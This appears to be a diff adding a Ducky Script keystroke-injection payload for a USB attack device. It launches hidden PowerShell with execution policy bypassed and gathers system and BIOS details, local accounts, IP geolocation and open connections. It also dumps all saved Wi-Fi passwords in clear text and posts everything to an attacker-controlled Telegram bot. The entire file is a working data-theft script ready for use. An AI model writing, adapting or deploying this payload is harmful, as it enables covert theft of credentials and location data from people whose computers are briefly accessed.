@@ -1,0 +1,35 @@
+DELAY 1000
+GUI
+DELAY 300
+STRING powershell -NoP -Exec Bypass -W H
+DELAY 500
+ENTER
+DELAY 2000
+
+STRING $ErrorActionPreference = 'SilentlyContinue';
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+STRING $botToken = "Add-Your-Token";
+STRING $chatID = "chat-ID";
+
+STRING $sysinfo = try {systeminfo | Select-String "Host Name|OS Name|OS Version|System Manufacturer|System Model|Total Physical Memory"} catch {"[!] System info failed"};
+STRING $bios = try {Get-WmiObject Win32_BIOS | Select-Object SerialNumber,Version | ForEach-Object {"$($_.SerialNumber) (v$($_.Version))"}} catch {"[!] BIOS info failed"};
+STRING $users = try {Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Select-Object Name,Status | Out-String} catch {"[!] User enum failed"};
+
+STRING $ipinfo = try {Invoke-RestMethod "https://ipapi.co/json/" -TimeoutSec 10} catch {[PSCustomObject]@{ip="[!] IP failed";org="[!] ISP failed";city="[!] Location failed";region="";country_name="";postal="";latitude=0;longitude=0}};
+STRING $connections = try {Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress,RemoteAddress,RemotePort | Out-String} catch {"[!] Connections failed"};
+
+STRING $wifi = @();
+STRING $profiles = try {(netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object {$_.Matches.Groups[1].Value.Trim()}} catch {""};
+STRING if ($profiles) {
+STRING     foreach ($p in $profiles) {
+STRING         $pass = try {(netsh wlan show profile name="$p" key=clear | Select-String "Key Content\s*:\s*(.+)").Matches.Groups[1].Value.Trim()} catch {$null};
+STRING         $wifi += [PSCustomObject]@{SSID=$p; Password=if($pass){$pass}else{"<no password>"}};
+STRING     } } else {
+STRING     $wifi = "[!] WiFi profiles failed"}
+
+STRING $msg = "[SYSTEM INFO]`n$sysinfo`n`n[BIOS]`n$bios`n`n[USERS]`n$users`n`n[NETWORK]`nIP: $($ipinfo.ip)`nISP: $($ipinfo.org)`nLocation: $($ipinfo.city), $($ipinfo.region)`nMap: https://www.google.com/maps?q=$($ipinfo.latitude),$($ipinfo.longitude)`n`n[WIFI]`n$(if($wifi -is [array]){$($wifi | Format-Table | Out-String)}else{$wifi})`n`n[CONNECTIONS]`n$connections`n`n[TIMESTAMP]`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')";
+
+STRING Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatID;text=$msg;disable_web_page_preview=$true};
+
+STRING exit;
+ENTER
